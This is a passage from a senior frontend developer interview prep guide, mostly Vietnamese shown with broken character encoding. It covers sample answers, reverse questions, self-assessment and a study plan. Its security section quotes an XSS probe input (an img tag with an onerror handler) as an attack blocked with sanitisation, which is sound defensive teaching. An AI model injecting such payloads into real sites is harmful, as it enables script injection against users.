> "Closure lÃ ... VÃ­ dá»¥ trong dá»± Ã¡n, tÃ´i dÃ¹ng closure Ä‘á»ƒ táº¡o private variables cho module pattern, trÃ¡nh global namespace pollution..." âœ…

---

#### **âŒ 2. KhÃ´ng nÃ³i trade-offs:**
> "Redux tá»‘t nháº¥t cho state management" âŒ

#### **âœ… Fix:**
> "Redux phÃ¹ há»£p vá»›i large apps cáº§n predictable state (time-travel debugging), nhÆ°ng cÃ³ boilerplate nhiá»u. Zustand Ä‘Æ¡n giáº£n hÆ¡n, phÃ¹ há»£p vá»›i small-medium apps. Jotai tá»‘t cho atomic state. TÃ´i chá»n dá»±a vÃ o team size, app complexity..." âœ…

---

#### **âŒ 3. NÃ³i dá»‘i hoáº·c pretend to know:**
> "TÃ´i ráº¥t giá»i WebRTC" (chÆ°a bao giá» dÃ¹ng) âŒ

#### **âœ… Fix:**
> "TÃ´i chÆ°a implement WebRTC trong production, nhÆ°ng tÃ´i hiá»ƒu concept cá»§a peer-to-peer communication, signaling server, ICE candidates. Náº¿u cáº§n, tÃ´i tá»± tin cÃ³ thá»ƒ learn vÃ  apply trong vÃ i ngÃ y vá»›i SimpleWebRTC hoáº·c PeerJS library..." âœ…

---

#### **âŒ 4. KhÃ´ng Ä‘á» cáº­p performance/security:**
> "TÃ´i dÃ¹ng axios.get() Ä‘á»ƒ fetch data" âŒ

#### **âœ… Fix:**
> "TÃ´i setup axios vá»›i interceptors Ä‘á»ƒ handle token refresh tá»± Ä‘á»™ng, request timeout 10s Ä‘á»ƒ avoid hanging, retry logic vá»›i exponential backoff cho network errors. ThÃªm global error handler Ä‘á»ƒ log lá»—i lÃªn Sentry. Performance: dÃ¹ng axios cancellation Ä‘á»ƒ abort outdated requests khi user navigate..." âœ…

---

#### **âŒ 5. KhÃ´ng show debugging skills:**
> "Code bá»‹ lá»—i, tÃ´i fix Ä‘Æ°á»£c rá»“i" âŒ

#### **âœ… Fix:**
> "Gáº·p bug memory leak trong useEffect. TÃ´i dÃ¹ng Chrome DevTools Memory Profiler, tháº¥y listeners khÃ´ng Ä‘Æ°á»£c cleanup. Fix: return cleanup function trong useEffect. Verify báº±ng cÃ¡ch record heap snapshot trÆ°á»›c/sau, memory giáº£m tá»« 150MB â†’ 80MB sau 5 phÃºt sá»­ dá»¥ng..." âœ…

---

## **ğŸ“Š III. CHIáº¾N LÆ¯á»¢C THEO Tá»ªNG NHÃ“M CÃ‚U Há»I**

### **ğŸ”¹ 1. JavaScript Core (Q1-Q14)**

**Má»¥c tiÃªu:** Chá»©ng minh **deep understanding** cá»§a language fundamentals.

**Key Points:**
- **Q4 (Event Loop):** Nháº¥n máº¡nh Microtask priority, real-world timing issues
- **Q5 (Closures):** Memory management, practical use cases (module pattern, currying)
- **Q6 (Hoisting & TDZ):** Táº¡i sao `const/let` better than `var` (block scope, temporal dead zone)
- **Q11 (Arrow vs Regular):** `this` binding, khi nÃ o KHÃ”NG dÃ¹ng arrow (methods, constructors)

**Senior Behaviors:**
- âœ… Giáº£i thÃ­ch **táº¡i sao** JavaScript thiáº¿t káº¿ nhÆ° váº­y (single-threaded, event-driven)
- âœ… So sÃ¡nh vá»›i **other languages** (Python async/await, Go goroutines)
- âœ… NÃªu **evolution** (ES5 â†’ ES6 â†’ ES2020+)
- âœ… Show **debugging techniques** (Chrome DevTools, console tricks)

**Example Deep Dive:**
```typescript
// Q5: Closure - Senior-level explanation vá»›i use case thá»±c táº¿

// âŒ Mid-level: "Closure lÃ  function trong function cÃ³ access outer scope"

// âœ… Senior-level:
"Closure tÃ´i dÃ¹ng trong 3 use cases chÃ­nh:

1. **Module Pattern (Encapsulation):**
   - Táº¡o private variables, expose public API
   - TrÃ¡nh global namespace pollution
   - Example: Counter module vá»›i private state

2. **Function Factories (Reusability):**
   - createMultiplier(5) â†’ function nhÃ¢n vá»›i 5
   - DÃ¹ng trong data transformation pipelines

3. **Event Handlers (State Management):**
   - Giá»¯ reference Ä‘áº¿n DOM elements
   - Cáº©n tháº­n memory leak náº¿u khÃ´ng cleanup
   - DÃ¹ng WeakMap Ä‘á»ƒ trÃ¡nh leak

**Pitfall tÃ´i Ä‘Ã£ gáº·p:**
- Closure trong loop vá»›i setTimeout â†’ giÃ¡ trá»‹ sai
- Fix: IIFE hoáº·c let trong for loop (block scope)
- Memory leak: Event listeners khÃ´ng remove â†’ closure giá»¯ reference
- Debug: Chrome Memory Profiler â†’ tÃ¬m detached DOM nodes"
```

---

### **ğŸ”¹ 2. React Ecosystem (Q15-Q31)**

**Má»¥c tiÃªu:** Show **production-ready** React skills vÃ  **architectural thinking**.

**Critical Areas:**
- **Q22 (Performance):** useMemo/useCallback/React.memo, virtualization (react-window)
- **Q23 (State Management):** Redux vs Zustand vs Jotai, khi nÃ o dÃ¹ng gÃ¬
- **Q26 (Hooks):** Custom hooks, rules, useEffect dependencies array
- **Q31 (SSR vs CSR):** Next.js, hydration, performance trade-offs

**Senior Behaviors:**
- âœ… NÃ³i vá» **bundle size** (tree-shaking, code splitting)
- âœ… **Performance metrics** (FCP, LCP, TTI)
- âœ… **Testing strategy** (Jest, React Testing Library, Cypress)
- âœ… **Architecture patterns** (Atomic Design, Feature-Sliced Design)

**Example Deep Dive:**
```typescript
// Q22: React Performance - Senior-level answer

"Performance optimization tÃ´i Ã¡p dá»¥ng trong production:

**1. Memoization Strategy:**
âœ… React.memo - Wrap components render nhiá»u láº§n vá»›i props khÃ´ng Ä‘á»•i
âœ… useMemo - Expensive calculations (filtering large lists)
âœ… useCallback - Avoid re-creating functions (pass to child components)

**Real Example:**
- Dashboard vá»›i 1000 items table
- Problem: Scroll lag, re-render toÃ n bá»™ table khi filter
- Solution:
  1. React.memo cho TableRow component
  2. useMemo cho filtered data
  3. useCallback cho event handlers
  4. react-window cho virtualization
- **Result:** 60fps smooth scrolling, render time tá»« 800ms â†’ 50ms

**2. Code Splitting:**
âœ… React.lazy + Suspense cho route-based splitting
âœ… Dynamic import cho heavy components (Chart, Editor)
âœ… Bundle size giáº£m tá»« 2.5MB â†’ 800KB initial

**3. Profiling Tools:**
âœ… React DevTools Profiler - TÃ¬m unnecessary re-renders
âœ… Chrome Performance tab - Measure actual FPS
âœ… Lighthouse - Track metrics over time

**Trade-offs:**
âŒ Over-optimization: useMemo everywhere â†’ code phá»©c táº¡p, khÃ³ maintain
âœ… Balance: Chá»‰ optimize khi cÃ³ performance issue thá»±c táº¿ (measured)

**Future Improvements:**
- Migrate React 18 - Concurrent features, automatic batching
- Use Suspense for data fetching (React Query)"
```

---

### **ğŸ”¹ 3. TypeScript (Q32-Q37, Q49)**

**Má»¥c tiÃªu:** Show **type safety** benefits vÃ  **advanced patterns**.

**Key Points:**
- **Q49 (Advanced):** Generics, utility types, conditional types
- **Q35 (Type Guards):** Runtime type checking, narrowing
- **Q37 (any vs unknown):** Type safety best practices

**Senior Behaviors:**
- âœ… Explain **why TypeScript** (catch bugs at compile time, better IDE support)
- âœ… Show **migration strategy** (tá»« JavaScript lÃªn TypeScript)
- âœ… **tsconfig.json** best practices (strict mode, path aliases)
- âœ… **Type inference** optimization (reduce explicit types)

**Example Deep Dive:**
```typescript
// Q49: TypeScript Advanced - Senior-level

"TypeScript giÃºp tÃ´i trong large codebase (100k+ LOC):

**1. Generics - Type Reusability:**
// API response wrapper
type ApiResponse<T> = {
  data: T;
  status: number;
  error?: string;
};

// Reuse cho má»i API call
const getUser = (): ApiResponse<User> => {...}
const getProducts = (): ApiResponse<Product[]> => {...}

**2. Utility Types - Transform Types:**
// Make all properties optional (for partial updates)
type UpdateUser = Partial<User>;

// Pick specific fields (for API responses)
type UserPreview = Pick<User, 'id' | 'name' | 'avatar'>;

// Omit sensitive fields
type PublicUser = Omit<User, 'password' | 'secretKey'>;

**3. Conditional Types - Logic in Types:**
// Different return type based on parameter
type Response<T extends 'json' | 'text'> = 
  T extends 'json' ? object : string;

**Real Impact:**
- Caught 200+ bugs before runtime (null checks, typos)
- Refactoring confidence: Rename property â†’ auto update 100+ files
- Onboarding: New devs hiá»ƒu code nhanh hÆ¡n (types = documentation)

**Migration Strategy (JS â†’ TS):**
1. Add tsconfig.json vá»›i strict: false
2. Rename .js â†’ .ts tá»«ng file (báº¯t Ä‘áº§u vá»›i utils)
3. Fix type errors (báº¯t Ä‘áº§u vá»›i @ts-ignore, rá»“i fix dáº§n)
4. Enable strict mode khi 80% codebase typed
5. Remove any types (dÃ¹ng unknown thay tháº¿)

**Tools:**
- ts-node - Run TypeScript directly (no build step)
- tsc --noEmit - Type check only (CI/CD)
- typescript-eslint - Enforce best practices"
```

---

### **ğŸ”¹ 4. Security & Performance (Q38-Q42)**

**Má»¥c tiÃªu:** Show **production security awareness** vÃ  **optimization skills**.

**Critical Areas:**
- **Q38 (Security):** XSS, CSRF, CSP, JWT best practices
- **Q39 (Optimization):** Lazy loading, code splitting, bundle analysis
- **Q40 (Web Vitals):** LCP, FID, CLS - measurable metrics

**Senior Behaviors:**
- âœ… **Security checklist** (input sanitization, HTTPS, secure cookies)
- âœ… **Performance budget** (bundle size < 200KB initial)
- âœ… **Monitoring** (Sentry, LogRocket, Google Analytics)
- âœ… **A/B testing** impact (conversion rate, bounce rate)

**Example Deep Dive:**
```typescript
// Q38: Security - Senior-level

"Security practices tÃ´i enforce trong má»i project:

**1. XSS Prevention:**
âœ… Never use dangerouslySetInnerHTML (trá»« khi sanitize báº±ng DOMPurify)
âœ… React tá»± Ä‘á»™ng escape JSX (safe by default)
âœ… CSP headers: script-src 'self' - Block inline scripts

**Real Attack tÃ´i Ä‘Ã£ block:**
- User input: <img src=x onerror=alert('XSS')>
- Solution: DOMPurify.sanitize(userInput) trÆ°á»›c khi render
- Result: Test vá»›i OWASP ZAP - no vulnerabilities found

**2. CSRF Protection:**
âœ… SameSite=Strict cookies
âœ… CSRF tokens cho state-changing requests
âœ… Verify Origin/Referer headers

**3. JWT Best Practices:**
âœ… Short expiry (15 min access token)
âœ… Refresh token rotation (httpOnly cookie)
âœ… Store JWT trong memory (NOT localStorage - vulnerable to XSS)
âœ… Logout: Blacklist token server-side (Redis)

**4. Dependencies Security:**
âœ… npm audit fix - Patch vulnerabilities
âœ… Dependabot - Auto PRs for updates
âœ… Snyk - Continuous monitoring

**Compliance:**
- OWASP Top 10 checklist
- Penetration testing quarterly (external firm)
- Security headers: HSTS, X-Frame-Options, X-Content-Type-Options"
```

---

### **ğŸ”¹ 5. API & Data (Q43-Q48)**

**Má»¥c tiÃªu:** Show **robust API handling** vÃ  **real-time communication**.

**Key Points:**
- **Q43 (Error Handling):** Retry logic, exponential backoff, global handler
- **Q44 (Axios):** Interceptors, cancellation, timeout
- **Q45 (WebSocket):** Real-time updates, reconnection strategy

**Senior Behaviors:**
- âœ… **Error recovery** strategies (retry, fallback, cache)
- âœ… **Loading states** (skeleton, optimistic updates)
- âœ… **Offline support** (Service Workers, IndexedDB)
- âœ… **API versioning** (v1, v2 compatibility)

**Example Deep Dive:**
```typescript
// Q43: Error Handling - Senior-level

"Robust error handling tÃ´i implement:

**1. Retry Strategy vá»›i Exponential Backoff:**
const retryRequest = async (fn, maxRetries = 3) => {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      const delay = Math.pow(2, i) * 1000; // 1s, 2s, 4s
      await sleep(delay);
    }
  }
};

**Use Case:**
- Network errors (500, 502, 503) â†’ Retry
- Client errors (400, 401, 404) â†’ NO retry (waste resources)

**2. Global Error Handler (Axios Interceptors):**
axios.interceptors.response.use(
  response => response,
  async error => {
    // Token expired â†’ Refresh
    if (error.response?.status === 401) {
      const newToken = await refreshToken();
      return axios(error.config); // Retry original request
    }
    
    // Log to Sentry
    Sentry.captureException(error);
    
    // Show user-friendly message
    toast.error(getErrorMessage(error));
    
    return Promise.reject(error);
  }
);

**3. Loading States:**
âœ… Skeleton screens (better UX than spinners)
âœ… Optimistic updates (update UI first, rollback if error)
âœ… Request deduplication (avoid duplicate calls)

**4. Offline Support:**
âœ… Service Worker caches API responses
âœ… Queue failed requests (retry when online)
âœ… Show offline banner (NetworkStatus component)

**Monitoring:**
- Sentry - Track error rates, stack traces
- LogRocket - Session replay for debugging
- Custom metrics - API success rate, avg response time"
```

---

### **ğŸ”¹ 6. Build Tools & Deployment (Q50-Q66)**

**Má»¥c tiÃªu:** Show **DevOps knowledge** vÃ  **CI/CD experience**.

**Key Points:**
- **Q56 (Module Federation):** Micro-frontends architecture
- **Q60 (Testing):** Unit/Integration/E2E strategy
- **Q62 (Docker):** Containerization, multi-stage builds
- **Q66 (Git):** Branching strategy, conflict resolution

**Senior Behaviors:**
- âœ… **CI/CD pipeline** setup (GitHub Actions, Jenkins)
- âœ… **Deployment strategies** (blue-green, canary)
- âœ… **Monitoring & Alerting** (Datadog, Grafana)
- âœ… **Rollback plans** (feature flags, version pinning)

**Example Deep Dive:**
```typescript
// Q60: Testing Strategy - Senior-level

"Testing pyramid tÃ´i Ã¡p dá»¥ng:

**1. Unit Tests (70%) - Fast & Isolated:**
âœ… Jest + React Testing Library
âœ… Test pure functions, custom hooks, utilities
âœ… Coverage target: 80% (khÃ´ng chase 100% - waste time)

Example:
// Test custom hook
test('useDebounce delays value update', async () => {
  const { result } = renderHook(() => useDebounce('test', 500));
  expect(result.current).toBe('');
  await waitFor(() => expect(result.current).toBe('test'), {
    timeout: 600
  });
});

**2. Integration Tests (20%) - Component Interactions:**
âœ… Test user flows (login, checkout, form submission)
âœ… Mock API calls (MSW - Mock Service Worker)
âœ… Test state management (Redux actions/reducers)

**3. E2E Tests (10%) - Critical Paths Only:**
âœ… Cypress hoáº·c Playwright
âœ… Test happy paths (login â†’ browse â†’ purchase)
âœ… Run trÃªn CI/CD (nightly builds - slow)

**CI/CD Pipeline (GitHub Actions):**
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - Checkout code
      - Install dependencies (cached)
      - Lint (ESLint, Prettier)
      - Type check (tsc --noEmit)
      - Unit tests (Jest)
      - Build (Vite)
      - E2E tests (Cypress on staging)
      - Deploy (if main branch)

**Quality Gates:**
âŒ Block merge náº¿u:
- Tests fail
- Coverage < 80%
- Linting errors
- Build fails
- Bundle size > 500KB (budget)

**Tools:**
- Codecov - Track coverage trends
- SonarQube - Code quality analysis
- Percy - Visual regression testing"
```

---

## **ğŸ¯ IV. CÃ‚U Há»I NGÆ¯á»¢C CHO INTERVIEWER (SENIOR-LEVEL)**

**Äá»«ng chá»‰ tráº£ lá»i - Há»I Láº I Ä‘á»ƒ show curiosity vÃ  business mindset:**

### **1. Technical Stack:**
- "Team Ä‘ang dÃ¹ng React version nÃ o? CÃ³ plans migrate React 18/19 khÃ´ng?"
- "State management hiá»‡n táº¡i? Redux hay modern alternatives nhÆ° Zustand?"
- "Micro-frontends architecture? Module Federation hay Monorepo (Nx, Turborepo)?"
- "CI/CD pipeline? GitHub Actions, Jenkins hay platform nÃ o?"

### **2. Team & Process:**
- "Code review process nhÆ° tháº¿ nÃ o? Pairing programming cÃ³ Ä‘Æ°á»£c encourage khÃ´ng?"
- "Testing strategy? Coverage requirements? E2E tests frequency?"
- "On-call rotation? Incident response process?"
- "Tech debt management? Dedicate time Ä‘á»ƒ refactor khÃ´ng?"

### **3. Product & Business:**
- "Biggest technical challenge team Ä‘ang face?"
- "Performance requirements? (SLA, uptime, response time)"
- "User base size? Traffic patterns? (Ä‘á»ƒ assess scaling needs)"
- "Roadmap 6-12 thÃ¡ng tá»›i? Features nÃ o prioritize?"

### **4. Growth & Learning:**
- "Learning budget? Conference/courses support?"
- "Innovation time? (Google 20% time concept)"
- "Mentorship program? Junior devs ratio?"
- "Career path? IC track vs Management track?"

**ğŸ’¡ Why these questions matter:**
- Shows **business thinking** (not just coding monkey)
- **Technical leadership** potential
- **Long-term commitment** (khÃ´ng chá»‰ job hop)
- **Cultural fit** assessment

---

## **ğŸ“ˆ V. SELF-ASSESSMENT CHECKLIST**

**TrÆ°á»›c khi phá»ng váº¥n, check xem báº¡n Ä‘Ã£ sáºµn sÃ ng chÆ°a:**

### **âœ… Technical Skills (Coding)**
- [ ] CÃ³ thá»ƒ code **live** (LeetCode Medium level trong 30-45 phÃºt)
- [ ] Giáº£i thÃ­ch **time/space complexity** (Big O notation)
- [ ] Debug code cá»§a ngÆ°á»i khÃ¡c (trÃªn whiteboard/screen share)
- [ ] Refactor legacy code (improve readability, performance)

### **âœ… System Design (Architecture)**
- [ ] Design **scalable frontend** (micro-frontends, CDN, caching)
- [ ] Trade-offs giá»¯a **monolith vs microservices**
- [ ] **API design** (REST vs GraphQL, versioning)
- [ ] **Database choices** (SQL vs NoSQL, when to use Redis)

### **âœ… Behavioral (Soft Skills)**
- [ ] Ká»ƒ **STAR stories** (3-5 stories sáºµn vá» challenges, failures, leadership)
- [ ] **Conflict resolution** (disagreement vá»›i team, PM)
- [ ] **Mentoring** experience (how you help juniors)
- [ ] **Project ownership** (end-to-end responsibility)

### **âœ… Business Acumen**
- [ ] Understand **metrics** (DAU, MAU, conversion rate, churn)
- [ ] **Stakeholder management** (communicate vá»›i non-tech people)
- [ ] **Prioritization** (urgent vs important, ROI thinking)
- [ ] **Cost awareness** (AWS bills, vendor costs)

---

## **ğŸš€ VI. FINAL TIPS CHO SENIOR INTERVIEW**

### **ğŸ”´ 1. DON'Ts (TrÃ¡nh nháº¥t)**
- âŒ **NÃ³i dá»‘i** vá» skills/experience (sáº½ bá»‹ expose qua technical questions)
- âŒ **Tranh luáº­n** vá»›i interviewer (even if you're right - ego kills offers)
- âŒ **Blame teammates** trong STAR stories (shows poor teamwork)
- âŒ **Say "I don't know" immediately** (try to reason first, then admit gap)
- âŒ **Overconfident** ("This is easy", "I can do this in 5 minutes")
- âŒ **Talk too much** (answer should be 2-3 minutes, not 10)

### **âœ… 2. DOs (Best Practices)**
- âœ… **Ask clarifying questions** (before coding/designing)
- âœ… **Think out loud** (interviewer wants to see thought process)
- âœ… **Admit gaps honestly** ("I haven't used X, but I can learn quickly")
- âœ… **Show enthusiasm** (about company, product, tech stack)
- âœ… **Follow up** after interview (thank you email, reiterate interest)
- âœ… **Negotiate** (salary, benefits, equity - you're senior, you have leverage)

### **ğŸ¯ 3. The "Senior Mindset" Framework**

**Mid-level thinks:** "How do I solve this problem?"

**Senior thinks:** 
- "What problem are we **actually** trying to solve?" (question requirements)
- "What are the **trade-offs**?" (no perfect solution)
- "How does this **scale**?" (10x users, 10x data)
- "How do we **maintain** this?" (6 months from now)
- "What's the **ROI**?" (engineering time vs business value)
- "How do we **monitor** this?" (observability, alerting)
- "What's the **rollback plan**?" (production safety)

**Example:**
```
Interviewer: "Implement autocomplete search"

âŒ Mid-level: Immediately starts coding debounce + API call

âœ… Senior: 
"Let me clarify requirements:
- Search scope? (local data vs remote API)
- Data size? (100 items vs 10M items â†’ different approaches)
- Latency tolerance? (instant vs 200ms delay)
- Offline support needed?
- Accessibility requirements? (keyboard navigation, screen reader)

Based on answers, I'd choose:
- Small dataset â†’ Trie data structure (instant search)
- Large dataset â†’ Debounced API + caching + virtualization
- High traffic â†’ CDN caching + edge functions (Cloudflare Workers)

Implementation considerations:
- Debounce 300ms (balance UX vs server load)
- Cancel outdated requests (AbortController)
- Loading state (skeleton, not spinner)
- Error handling (retry, fallback to recent searches)
- Monitoring (search latency, error rate)
- A/B test (conversion rate impact)

Now let me code the core logic..."
```

**ğŸ’¡ See the difference?**
- Senior **challenges assumptions**
- Considers **multiple solutions**
- Thinks about **real-world constraints**
- Plans for **monitoring & debugging**
- Measures **business impact**

---

## **ğŸ“Š VII. SCORING RUBRIC (Tá»± Ä‘Ã¡nh giÃ¡)**

**Grade yourself honestly trÃªn tá»«ng area (1-5 scale):**

### **Technical Depth (40%)**
```
Score 5 (Expert): 
- Explain concepts to juniors clearly
- Know edge cases, gotchas
- Can debug obscure issues
- Contribute to open source / write tech blogs

Score 3 (Competent):
- Use daily in work
- Understand common patterns
- Google for edge cases

Score 1 (Novice):
- Heard of it, but never used
```

**Self-assess:**
- [ ] JavaScript fundamentals: ___/5
- [ ] React ecosystem: ___/5
- [ ] TypeScript: ___/5
- [ ] Performance optimization: ___/5
- [ ] Security: ___/5
- [ ] Testing: ___/5
- [ ] Build tools: ___/5
- [ ] DevOps/CI/CD: ___/5

**Target for Senior: 4+ on core skills, 3+ on others**

---

### **System Design (30%)**
```
Score 5: Design Netflix/Uber frontend from scratch
Score 3: Design feature within existing app (chat, notifications)
Score 1: Implement component given spec
```

**Self-assess:**
- [ ] Can design scalable architectures: ___/5
- [ ] Understand trade-offs (monolith vs micro): ___/5
- [ ] Know when to use patterns (MVC, Flux, etc): ___/5
- [ ] Database/API design knowledge: ___/5

---

### **Leadership (20%)**
```
Score 5: Led team, mentored multiple juniors, defined standards
Score 3: Mentored 1-2 juniors, led small projects
Score 1: Work independently, no mentoring experience
```

**Self-assess:**
- [ ] Mentoring experience: ___/5
- [ ] Code review quality: ___/5
- [ ] Documentation writing: ___/5
- [ ] Stakeholder communication: ___/5

---

### **Business Acumen (10%)**
```
Score 5: Understand product strategy, propose features, track metrics
Score 3: Understand company goals, align work with OKRs
Score 1: Just implement assigned tickets
```

**Self-assess:**
- [ ] Understand business metrics: ___/5
- [ ] Prioritization skills: ___/5
- [ ] Cost awareness: ___/5

---

**TOTAL SCORE: ___/20 (average of all categories)**

- **18-20:** Top-tier senior (ready for Staff/Principal roles)
- **15-17:** Strong senior (hire immediately)
- **12-14:** Mid-senior (hire with some mentoring)
- **<12:** Need more experience (mid-level role better fit)

---

## **ğŸ¯ VIII. STUDY PLAN (Last-Minute Prep)**

**Náº¿u cÃ²n 1 tuáº§n trÆ°á»›c interview:**

### **Day 1-2: Core JavaScript (Q1-Q14)**
- Focus: Event Loop, Closures, Promises, this binding
- Practice: Solve 5 coding challenges (closures, async patterns)
- Deep dive: Read 2 articles vá» Event Loop internals

### **Day 3-4: React & Performance (Q15-Q31)**
- Focus: Hooks, Performance, State Management
- Practice: Build mini-app vá»›i useMemo/useCallback optimization
- Deep dive: Read React 18 docs (concurrent features)

### **Day 5: Security & APIs (Q38-Q48)**
- Focus: XSS/CSRF, Error handling, WebSocket
- Practice: Implement JWT auth flow + error boundary
- Deep dive: OWASP Top 10 checklist

### **Day 6: TypeScript & Testing (Q32-Q37, Q49, Q60)**
- Focus: Generics, Utility types, Testing pyramid
- Practice: Convert JS project to TypeScript
- Deep dive: Write unit + integration tests

### **Day 7: System Design & Mock Interview**
- Morning: Design 2 systems (Twitter feed, Chat app)
- Afternoon: Mock behavioral interview (STAR stories)
- Evening: Review notes, sleep well

**ğŸ’¡ Remember:**
- **Quality > Quantity** (hiá»ƒu sÃ¢u 10 topics > biáº¿t sÆ¡ 100 topics)
- **Practice coding out loud** (explain while coding)
- **Review past projects** (refresh memory for STAR stories)
- **Rest before interview** (don't cram night before)

---

## **ğŸ† IX. SUCCESS METRICS**

**How to know you nailed the interview:**

### **âœ… Positive Signals:**
- Interviewer **engages deeply** in your answers (follow-up questions)
- You **asked good questions** back (shows curiosity)
- Time **runs over** (they're interested)
- They discuss **next steps** unprompted
- Introduced to **other team members**
- Talk about **when you can start** (not "if")

### **âŒ Red Flags:**
- **Short answers** cut off your explanations
- Interviewer seems **disengaged** (checking phone)
- Interview **ends early**
- No discussion of **next steps**
- Only **surface-level questions** (not deep dive)

---

## **ğŸ“ X. BEYOND THE INTERVIEW**

**Senior role is not just about passing interviews - it's ongoing growth:**

### **Continuous Learning:**
- **Weekly:** Read 2-3 tech articles (dev.to, Medium, CSS-Tricks)
- **Monthly:** Try 1 new tool/library (experiment weekend project)
- **Quarterly:** Attend 1 conference or watch recorded talks
- **Yearly:** Master 1 new major skill (e.g., WebGL, Three.js, Rust WASM)

### **Community Contribution:**
- **Open source:** Fix bugs, improve docs, review PRs
- **Blogging:** Share learnings (build personal brand)
- **Mentoring:** Help juniors (Stack Overflow, Discord, local meetups)
- **Speaking:** Give talks at meetups/conferences (conquers fear)

### **Career Growth Path:**
```
Junior (0-2 years) â†’ Mid (2-5 years) â†’ Senior (5-8 years)
                                              â†“
                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                          â†“                                     â†“
                    IC Track                              Management Track
                          â†“                                     â†“
        Staff â†’ Principal â†’ Distinguished              Tech Lead â†’ EM â†’ Director
```

**Senior is not the end - it's the beginning of specialization!**

---

## **ğŸ’¡ FINAL WORDS**

**Remember:**

> **"Senior Developer khÃ´ng pháº£i lÃ  ngÆ°á»i biáº¿t Táº¤T Cáº¢.  
> Senior lÃ  ngÆ°á»i biáº¿t CÃI GÃŒ quan trá»ng, biáº¿t Há»I Ä‘Ãºng cÃ¢u há»i,  
> biáº¿t Há»ŒC nhanh, vÃ  biáº¿t Dáº Y ngÆ°á»i khÃ¡c."**

**Top 3 traits of great seniors:**
1. **Humility** - Admit gaps, learn from juniors, no ego
2. **Empathy** - Understand users, teammates, business needs
3. **Impact** - Focus on what moves the needle (not just "cool tech")

---

**Good luck! Báº¡n Ä‘Ã£ chuáº©n bá»‹ 36,000+ dÃ²ng kiáº¿n thá»©c.**  
**BÃ¢y giá» lÃ  lÃºc SHINE! ğŸŒŸ**

**Remember:** Interviewer cÅ©ng lÃ  con ngÆ°á»i. Há» muá»‘n báº¡n **succeed** (hiring is hard).  
Be **confident**, be **curious**, be **kind**. You got this! ğŸ’ª

---

**P.S.** Sau khi nháº­n offer, Ä‘á»«ng quÃªn:
1. **Negotiate** - Senior salary range wide (cÃ³ thá»ƒ tÄƒng 20-30% náº¿u negotiate well)
2. **Check equity** - Stock options/RSUs matter (especially startups)
3. **Ask about team** - Manager quality > Company brand
4. **Work-life balance** - Burnout kills careers (sustainable pace > sprint)

**Now go ace that interview! ğŸš€**

---

